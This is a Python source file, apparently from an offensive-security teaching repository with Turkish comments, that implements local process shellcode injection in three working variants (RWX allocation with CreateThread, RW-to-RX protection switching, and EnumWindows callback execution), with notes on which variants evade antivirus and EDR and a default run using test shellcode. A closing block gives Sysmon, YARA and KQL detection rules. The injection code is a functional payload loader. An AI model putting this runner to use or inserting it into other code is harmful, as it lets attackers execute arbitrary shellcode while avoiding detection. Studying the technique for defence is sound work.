"""
Technique 1: Local Process Injection (Shellcode Runner)
========================================================
En basit shellcode injection tekniği - kendi process'ine enjekte eder.

MITRE ATT&CK: T1055 - Process Injection

API Çağrı Sırası:
1. VirtualAlloc() - Bellek ayır (RWX)
2. RtlMoveMemory/memcpy - Shellcode'u kopyala
3. CreateThread() - Thread oluştur ve çalıştır

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.win_api import (
    VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    PAGE_EXECUTE_READ, INFINITE, print_api_call, GetLastError
)

# ============================================================================
# EXPLANATION - AÇIKLAMA
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    TECHNIQUE 1: LOCAL PROCESS INJECTION                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 AÇIKLAMA:                                                                ║
║  ─────────────                                                               ║
║  En basit shellcode çalıştırma tekniği. Shellcode, çalışan process'in       ║
║  kendi bellek alanına yazılır ve aynı process içinde çalıştırılır.          ║
║                                                                              ║
║  🔄 API ÇAĞRI AKIŞI:                                                         ║
║  ───────────────────                                                         ║
║                                                                              ║
║  ┌─────────────────┐                                                         ║
║  │  VirtualAlloc   │ ──► Bellek ayır (RWX veya RW)                          ║
║  └────────┬────────┘                                                         ║
║           │                                                                  ║
║           ▼                                                                  ║
║  ┌─────────────────┐                                                         ║
║  │  RtlMoveMemory  │ ──► Shellcode'u belleğe kopyala                        ║
║  └────────┬────────┘                                                         ║
║           │                                                                  ║
║           ▼                                                                  ║
║  ┌─────────────────┐                                                         ║
║  │ VirtualProtect  │ ──► (Opsiyonel) RW → RX değiştir                       ║
║  └────────┬────────┘                                                         ║
║           │                                                                  ║
║           ▼                                                                  ║
║  ┌─────────────────┐                                                         ║
║  │  CreateThread   │ ──► Yeni thread oluştur, shellcode'u çalıştır          ║
║  └────────┬────────┘                                                         ║
║           │                                                                  ║
║           ▼                                                                  ║
║  ┌─────────────────┐                                                         ║
║  │WaitForSingleObj │ ──► Thread'in bitmesini bekle                          ║
║  └─────────────────┘                                                         ║
║                                                                              ║
║  🎯 KULLANIM ALANLARI:                                                       ║
║  ─────────────────────                                                       ║
║  • Basit payload çalıştırma                                                  ║
║  • Shellcode testi                                                           ║
║  • İlk aşama dropper'lar                                                     ║
║                                                                              ║
║  ⚠️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • VirtualAlloc ile PAGE_EXECUTE_READWRITE (RWX) bellek ayırma              ║
║  • CreateThread ile yeni thread oluşturma                                    ║
║  • Bellek bölgesinin RWX izinleri                                           ║
║                                                                              ║
║  🛡️ BLUE TEAM DETECTION:                                                     ║
║  ─────────────────────────                                                   ║
║  • Sysmon Event ID 8 (CreateRemoteThread - local için de loglanır)          ║
║  • ETW: Microsoft-Windows-Kernel-Memory                                      ║
║  • Memory forensics: RWX bölgeleri tara                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# METHOD 1: BASIC (RWX Memory)
# ============================================================================

def inject_basic(shellcode: bytes, verbose: bool = True) -> bool:
    """
    En basit injection - Tek adımda RWX bellek kullanır.
    
    ⚠️ ÖNEMLİ: RWX bellek çok şüpheli, AV/EDR kolayca tespit eder!
    
    Args:
        shellcode: Çalıştırılacak shellcode
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print("\n🚀 Method 1: Basic Injection (RWX Memory)")
        print("="*60)
    
    # Step 1: Allocate RWX memory
    if verbose:
        print("\n[1/3] VirtualAlloc() - RWX bellek ayırma...")
    
    addr = VirtualAlloc(
        None,                           # lpAddress - NULL = sistem seçer
        len(shellcode),                 # dwSize - shellcode boyutu
        MEM_COMMIT | MEM_RESERVE,       # flAllocationType
        PAGE_EXECUTE_READWRITE          # flProtect - RWX ⚠️ ŞÜPHELİ!
    )
    
    if not addr:
        print(f"❌ VirtualAlloc başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Bellek ayrıldı: 0x{addr:016X}")
        print(f"   📏 Boyut: {len(shellcode)} bytes")
        print(f"   🔓 İzinler: PAGE_EXECUTE_READWRITE (RWX)")
    
    # Step 2: Copy shellcode to allocated memory
    if verbose:
        print("\n[2/3] RtlMoveMemory() - Shellcode kopyalama...")
    
    ctypes.memmove(addr, shellcode, len(shellcode))
    
    if verbose:
        print(f"   ✅ Shellcode kopyalandı: {len(shellcode)} bytes")
    
    # Step 3: Create thread and execute
    if verbose:
        print("\n[3/3] CreateThread() - Thread oluşturma ve çalıştırma...")
    
    thread_id = wintypes.DWORD()
    thread_handle = CreateThread(
        None,                           # lpThreadAttributes
        0,                              # dwStackSize (default)
        addr,                           # lpStartAddress - shellcode adresi
        None,                           # lpParameter
        0,                              # dwCreationFlags (hemen çalıştır)
        ctypes.byref(thread_id)         # lpThreadId
    )
    
    if not thread_handle:
        print(f"❌ CreateThread başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Thread oluşturuldu!")
        print(f"   🧵 Thread Handle: 0x{thread_handle:X}")
        print(f"   🆔 Thread ID: {thread_id.value}")
    
    # Wait for thread to complete
    if verbose:
        print("\n[*] WaitForSingleObject() - Thread bekleniyor...")
    
    WaitForSingleObject(thread_handle, INFINITE)
    
    if verbose:
        print("   ✅ Thread tamamlandı!")
        print("\n" + "="*60)
        print("🎉 INJECTION BAŞARILI!")
        print("="*60)
    
    return True

# ============================================================================
# METHOD 2: SAFER (RW → RX)
# ============================================================================

def inject_rwx_split(shellcode: bytes, verbose: bool = True) -> bool:
    """
    Daha güvenli injection - RW ile yaz, RX'e çevir.
    
    Bu yöntem daha az şüpheli çünkü:
    - Hiçbir zaman aynı anda hem yazılabilir hem çalıştırılabilir değil
    - Gerçek uygulamalara daha yakın davranış
    
    Args:
        shellcode: Çalıştırılacak shellcode
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print("\n🚀 Method 2: RW → RX Split Injection")
        print("="*60)
    
    # Step 1: Allocate RW memory (not executable yet)
    if verbose:
        print("\n[1/4] VirtualAlloc() - RW bellek ayırma...")
    
    addr = VirtualAlloc(
        None,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE                  # Sadece RW - executable değil
    )
    
    if not addr:
        print(f"❌ VirtualAlloc başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Bellek ayrıldı: 0x{addr:016X}")
        print(f"   🔓 İzinler: PAGE_READWRITE (RW) - executable DEĞİL")
    
    # Step 2: Copy shellcode
    if verbose:
        print("\n[2/4] RtlMoveMemory() - Shellcode kopyalama...")
    
    ctypes.memmove(addr, shellcode, len(shellcode))
    
    if verbose:
        print(f"   ✅ Shellcode kopyalandı")
    
    # Step 3: Change protection to RX (executable, not writable)
    if verbose:
        print("\n[3/4] VirtualProtect() - RW → RX değiştirme...")
    
    old_protect = wintypes.DWORD()
    result = VirtualProtect(
        addr,
        len(shellcode),
        PAGE_EXECUTE_READ,              # RX - executable ama yazılamaz
        ctypes.byref(old_protect)
    )
    
    if not result:
        print(f"❌ VirtualProtect başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ İzinler değiştirildi: RW → RX")
        print(f"   📋 Eski izin: 0x{old_protect.value:02X}")
        print(f"   📋 Yeni izin: PAGE_EXECUTE_READ")
    
    # Step 4: Create thread and execute
    if verbose:
        print("\n[4/4] CreateThread() - Thread oluşturma...")
    
    thread_id = wintypes.DWORD()
    thread_handle = CreateThread(
        None, 0, addr, None, 0,
        ctypes.byref(thread_id)
    )
    
    if not thread_handle:
        print(f"❌ CreateThread başarısız! Error: {GetLastError()}")
        return False
    
    if verbose:
        print(f"   ✅ Thread oluşturuldu: TID={thread_id.value}")
    
    WaitForSingleObject(thread_handle, INFINITE)
    
    if verbose:
        print("\n" + "="*60)
        print("🎉 INJECTION BAŞARILI (RW→RX yöntemi)")
        print("="*60)
    
    return True

# ============================================================================
# METHOD 3: CALLBACK BASED
# ============================================================================

def inject_callback(shellcode: bytes, verbose: bool = True) -> bool:
    """
    Callback-based execution - EnumWindows veya benzeri API kullanır.
    CreateThread kullanmaz, daha az şüpheli.
    
    Args:
        shellcode: Çalıştırılacak shellcode
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print("\n🚀 Method 3: Callback-based Injection")
        print("="*60)
    
    # Allocate and copy (same as before)
    addr = VirtualAlloc(
        None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if not addr:
        return False
    
    ctypes.memmove(addr, shellcode, len(shellcode))
    
    # Change to RX
    old_protect = wintypes.DWORD()
    VirtualProtect(addr, len(shellcode), PAGE_EXECUTE_READ, ctypes.byref(old_protect))
    
    # Execute via callback
    if verbose:
        print("\n[*] EnumWindows callback ile çalıştırma...")
    
    # Create callback function type
    WNDENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    
    # Cast our shellcode address to callback
    callback = WNDENUMPROC(addr)
    
    # This will execute our shellcode as a callback
    # Note: This is a simplified example, real implementation needs more care
    try:
        ctypes.windll.user32.EnumWindows(callback, 0)
    except Exception as e:
        if verbose:
            print(f"   ⚠️ Exception (expected): {e}")
    
    if verbose:
        print("   ✅ Callback execution completed")
    
    return True

# ============================================================================
# DETECTION SIGNATURES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                         🛡️ BLUE TEAM DETECTION RULES                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 SYSMON DETECTION:                                                        ║
║  ────────────────────                                                        ║
║                                                                              ║
║  <!-- Sysmon Config - Local Thread Creation -->                              ║
║  <RuleGroup name="ProcessInjection" groupRelation="or">                      ║
║    <CreateRemoteThread onmatch="include">                                    ║
║      <TargetImage condition="is">Current Process</TargetImage>               ║
║    </CreateRemoteThread>                                                     ║
║  </RuleGroup>                                                                ║
║                                                                              ║
║  📋 YARA RULE:                                                               ║
║  ─────────────                                                               ║
║                                                                              ║
║  rule Local_Shellcode_Injection {                                            ║
║      meta:                                                                   ║
║          description = "Detects local shellcode injection pattern"          ║
║          mitre = "T1055"                                                     ║
║      strings:                                                                ║
║          $api1 = "VirtualAlloc" ascii wide                                   ║
║          $api2 = "CreateThread" ascii wide                                   ║
║          $prot = { 40 00 00 00 }  // PAGE_EXECUTE_READWRITE                  ║
║      condition:                                                              ║
║          all of ($api*) and $prot                                            ║
║  }                                                                           ║
║                                                                              ║
║  📋 KQL QUERY (Microsoft Defender):                                          ║
║  ──────────────────────────────────                                          ║
║                                                                              ║
║  DeviceEvents                                                                ║
║  | where ActionType == "CreateThreadApiCall"                                 ║
║  | where InitiatingProcessId == TargetProcessId  // Same process             ║
║  | project Timestamp, DeviceName, InitiatingProcessFileName,                 ║
║            TargetProcessFileName, ThreadId                                   ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║  • Executable memory allocation (PAGE_EXECUTE_*)                             ║
║  • VirtualAlloc followed by CreateThread                                     ║
║  • Memory region with no backing file (private memory)                       ║
║  • Unusual thread start address (not in known module)                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    # Test shellcode - Calculator
    # Bu shellcode Windows Calculator'ı açar
    print("\n📦 Test için calc.exe shellcode kullanılacak...")
    
    # Import test shellcode
    try:
        from payloads.test_shellcodes import CALC_SHELLCODE_X64
        shellcode = CALC_SHELLCODE_X64
        print(f"   ✅ Shellcode yüklendi: {len(shellcode)} bytes")
    except ImportError:
        print("   ⚠️ Test shellcode bulunamadı, NOP sled kullanılacak")
        shellcode = bytes([0x90] * 100 + [0xC3])  # NOP + RET
    
    # Run injection
    print("\n" + "="*60)
    print("🎯 INJECTION BAŞLATILIYOR...")
    print("="*60)
    
    # Method 1: Basic
    # inject_basic(shellcode)
    
    # Method 2: RW → RX (daha güvenli)
    inject_rwx_split(shellcode)
    
    # Print detection rules
    print(DETECTION_RULES)
